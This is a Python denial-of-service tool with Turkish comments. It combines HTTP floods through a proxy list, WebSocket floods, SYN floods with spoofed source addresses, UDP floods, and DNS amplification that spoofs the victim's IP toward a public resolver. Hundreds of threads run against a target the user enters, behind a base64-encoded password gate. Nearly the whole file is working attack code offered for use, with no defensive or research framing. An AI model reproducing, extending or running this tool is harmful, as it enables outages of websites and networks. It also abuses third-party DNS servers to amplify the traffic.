
import socket
import threading
import random
import requests
from scapy.all import *
from websocket import create_connection
import time
import hashlib
import os
import base64
from hmac import compare_digest

# User-Agent listesi (HTTP Flood için)
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/53.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1 Safari/603.2.4'
]

# proxy.txt dosyasından proxy'leri yükleme
def load_proxies(file_path='proxy.txt'):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f.readlines():
                proxy = line.strip()
                if proxy:
                    proxies.append({'http': f'http://{proxy}', 'https': f'https://{proxy}'})
        print(f"{len(proxies)} proxy yüklendi.")
    except FileNotFoundError:
        print("proxy.txt dosyası bulunamadı.")
        raise Exception("Proxy listesi yüklenemedi, sistem kilitlendi!")
    return proxies

# HTTP/2 Flood (Layer 7) Saldırı Fonksiyonu
def http2_flood(target_url, proxies, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            proxy = random.choice(proxies) if proxies else None
            response = requests.get(target_url, headers=headers, proxies=proxy, timeout=5)
            print(f"HTTP/2 Flood - {target_url} Status: {response.status_code}")
        except Exception as e:
            print(f"HTTP/2 Flood hatası: {str(e)}")

# WebSocket Flood (Layer 7) Saldırı Fonksiyonu
def websocket_flood(target_url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            ws = create_connection(target_url)
            ws.send(f"Flood: {random.randint(1, 1000)}")
            ws.close()
            print(f"WebSocket Flood - {target_url}")
        except Exception as e:
            print(f"WebSocket Flood hatası: {str(e)}")

# SYN Flood (Layer 4) Saldırı Fonksiyonu
def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            syn_packet = IP(src=source_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            send(syn_packet, verbose=False)
        except Exception as e:
            print(f"SYN Flood hatası: {str(e)}")

# UDP Flood (Layer 4) Saldırı Fonksiyonu
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            client.sendto(data, (target_ip, target_port))
            print(f"UDP Flood - {target_ip}:{target_port}")
        except Exception as e:
            print(f"UDP Flood hatası: {str(e)}")

# DNS Amplifikasyon Saldırısı
def dns_amplification(target_ip, duration):
    dns_server = "8.8.8.8"  # Google Public DNS
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            dns_query = IP(dst=dns_server, src=target_ip)/UDP()/DNS(rd=1,qd=DNSQR(qname="google.com"))
            send(dns_query, verbose=False)
        except Exception as e:
            print(f"DNS Amplifikasyon hatası: {str(e)}")

# Saldırı Başlatma Fonksiyonu
def start_attack(target_url, target_ip, target_port, proxies, duration):
    threads = []

    # HTTP/2 Flood saldırısı için threadler oluştur
    for _ in range(500):  # 500 thread ile saldırı başlat
        thread = threading.Thread(target=http2_flood, args=(target_url, proxies, duration))
        thread.start()
        threads.append(thread)

    # WebSocket Flood saldırısı için threadler oluştur
    for _ in range(200):  # 200 thread ile WebSocket saldırı başlat
        thread = threading.Thread(target=websocket_flood, args=(target_url, duration))
        thread.start()
        threads.append(thread)

    # SYN Flood saldırısı için threadler oluştur
    for _ in range(200):  # 200 thread ile SYN Flood başlat
        thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
        thread.start()
        threads.append(thread)

    # UDP Flood saldırısı için threadler oluştur
    for _ in range(200):  # 200 thread ile UDP Flood başlat
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        thread.start()
        threads.append(thread)

    # DNS Amplifikasyon saldırısı için threadler oluştur
    for _ in range(100):  # 100 thread ile DNS Amplifikasyon başlat
        thread = threading.Thread(target=dns_amplification, args=(target_ip, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # Kullanıcıdan şifreyi al
    password = input("Lütfen güvenlik şifresini girin: ")

    # Şifre kontrolü
    encoded_password = "ZW1pcmNzc3I="  # "emircssr" base64 ile şifrelenmiş hali
    if password != base64.b64decode(encoded_password).decode('utf-8'):
        print("Hatalı şifre! Erişim reddedildi.")
        exit()

    # Kullanıcıdan saldırı parametrelerini al
    target_url = input("Hedef URL'yi girin (örn: http://targetwebsite.com): ")
    target_ip = input("Hedef IP'yi girin (örn: 192.168.1.1): ")
    target_port = int(input("Hedef Port'u girin (örn: 80): "))
    duration = int(input("Saldırı süresi kaç saniye olsun?: "))

    # Son onay sorusu
    confirmation = input("Bunu yapmak istediğinizden emin misiniz? (evet/hayır): ").lower()

    if confirmation == 'evet':
        # Proxyleri proxy.txt dosyasından yükle
        proxies = load_proxies()

        print("Saldırı başlatılıyor...")
        start_attack(target_url, target_ip, target_port, proxies, duration)
    else:
        print("Saldırı iptal edildi.")
